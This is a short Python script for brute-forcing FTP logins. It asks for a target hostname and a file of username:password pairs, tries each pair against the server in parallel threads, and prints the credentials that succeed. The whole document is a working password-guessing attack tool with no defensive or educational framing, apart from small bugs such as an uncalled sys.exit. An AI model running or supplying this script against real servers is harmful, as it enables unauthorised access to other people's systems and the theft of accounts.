#!/usr/bin/python3


import ftplib

from termcolor import colored
import threading
import sys

def anonymouslogin(hostname,filename):
    try:
        fl=open(filename,'r')
    except:
        print('Excpetion when opening the file')
    for line in fl.readlines():
        try:
           # connect(line)
            t=threading.Thread(target=connect,args=(line,'p'))
            t.start()
        except:
            pass
def connect(line,p):
        try:
            line=line.strip('\n')
            username=line.split(':')[0]
            password=line.split(':')[1]
            ftp=ftplib.FTP(hostname)
            ftp.login(username,password)
            ftp.quit()
            print(colored('login successful '+username+'/'+password,'green'))
            sys.exit
            return
        except:
            print(colored('login failed '+username+'/'+password,'red'))
            pass


hostname=input('Enter the hostname of Target > ')
filename=input('Enter the file name which consists of username:passwords > ')
anonymouslogin(hostname,filename)

